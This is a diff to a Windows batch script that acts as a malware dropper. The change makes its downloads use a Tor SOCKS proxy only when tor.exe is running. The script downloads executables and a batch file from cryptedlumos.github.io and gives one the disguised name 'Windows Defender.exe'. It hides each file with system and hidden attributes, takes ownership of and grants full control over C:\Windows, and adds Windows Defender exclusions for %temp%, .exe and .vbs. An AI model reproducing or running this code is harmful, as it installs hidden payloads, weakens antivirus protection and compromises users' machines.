@@ -4,6 +4,11 @@ attrib +s +h +i "C:\Tor"
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
 
+tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
+if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
+  set "proxy="
+)
+
 for /f "tokens=1* delims=: " %%A in (
   'powershell Get-WmiObject Win32_Computersystem model 2^>NUL^|find "Model            :"'
 ) Do set model=%%B
@@ -38,7 +43,7 @@ start "" "%windir%\explorer.exe"
 mkdir "%appdata%\microsoft\windows\Templates"
 mkdir "%appdata%\microsoft\Network"
 
-curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe"
 attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
 attrib +s +h +i "%AppData%\Microsoft\Windows\Templates"
 
@@ -52,9 +57,9 @@ TAKEOWN /F "C:\Windows"
 ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 
 cd "C:\Windows"
-curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "nircmd.exe"
-curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "curl.exe"
-curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "win64.bat"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "nircmd.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "curl.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "win64.bat"
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
